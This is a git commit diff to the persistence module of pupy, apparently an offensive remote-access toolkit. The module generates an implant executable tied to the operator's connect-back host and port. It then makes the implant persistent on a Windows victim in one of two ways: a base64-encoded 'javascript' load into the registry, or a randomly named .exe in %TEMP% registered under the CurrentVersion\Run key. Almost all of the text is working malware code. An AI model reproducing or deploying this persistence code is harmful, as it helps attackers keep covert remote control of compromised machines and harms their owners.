f82c06afdb04ab17e46024c747332e7df75a8edf
golind <brahui@ruggedinbox.com>
2015-10-26 20:55:54 +0000

    Update persistence.py
    did some renaming/reorganization and added javascript option of registry start

--- pupy/modules/persistence.py
+++ pupy/modules/persistence.py
@@ -19,6 +19,7 @@ import random
 import pupygen
 import os.path
 import string
+import base64
 
 __class_name__="PersistenceModule"
 
@@ -27,7 +28,7 @@ class PersistenceModule(PupyModule):
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
 		self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
-		self.arg_parser.add_argument('-m','--method', choices=['registry'], required=True, help='persistence method')
+		self.arg_parser.add_argument('-m','--method', choices=['javascript','binary'], required=True, help='persistence method: javascript option aims to load a b64 encoded directly into the registry [experimental]; binary option aims to save a copy in the %TEMP% folder location and add to registry')
 
 	@windows_only
 	def is_compatible(self):
@@ -44,37 +45,45 @@ class PersistenceModule(PupyModule):
 			res=self.client.conn.modules['pupy'].get_connect_back_host()
 			host, port=res.rsplit(':',1)
 			#generating exe
-			self.info("generating exe ...")
 			if self.client.desc['proc_arch']=="64bit":
-				exebuff=pupygen.get_edit_pupyx64_exe(host, port)
+				self.info("generating x64 exe ...")
+				exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
 			else:
-				exebuff=pupygen.get_edit_pupyx86_exe(host, port)
-		if args.method=="registry":
+				self.info("generating x86 exe ...")
+				exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
+		try:
 			self.client.load_package("pupwinutils.persistence")
 
+			if args.method=="javascript":
+				#encoding binary
+				encoded = base64.b64encode(exebuff)
+				self.info("file registry load ...")
+				print self.client.conn.modules['pupwinutils.persistence'].registry_check('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','C:\\WINDOWS\\system32\\rundll32.exe')
+				self.client.conn.modules['pupwinutils.persistence'].javascript_startup(encoded)
 
+			elif args.method=="binary":
+				remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
 
-			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
-			self.info("uploading to %s ..."%remote_path)
-			#uploading
-			rf=self.client.conn.builtin.open(remote_path, "wb")
-			chunk_size=16000
-			pos=0
-			while True:
-				buf=exebuff[pos:pos+chunk_size]
-				if not buf:
-					break
-				rf.write(buf)
-				pos+=chunk_size
-			rf.close()
-			self.success("upload successful")
+				self.info("uploading to %s ..."%remote_path)
+				#uploading
+				rf=self.client.conn.builtin.open(remote_path, "wb")
+				chunk_size=16000
+				pos=0
+				while True:
+					buf=exebuff[pos:pos+chunk_size]
+					if not buf:
+						break
+					rf.write(buf)
+					pos+=chunk_size
+				rf.close()
+				self.success("upload successful")
+				self.info("adding to registry ...") 
+				print self.client.conn.modules['pupwinutils.persistence'].registry_check('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',remote_path)
+				
+				#adding persistency
+				self.client.conn.modules['pupwinutils.persistence'].binary_startup(remote_path)
 
-			#adding persistency
-			self.info("adding to registry ...")
-			self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(remote_path)
 			self.info("registry key added")
-
 			self.success("persistence added !")
-		else:
+		except:
 			self.error("method not implemented")
-
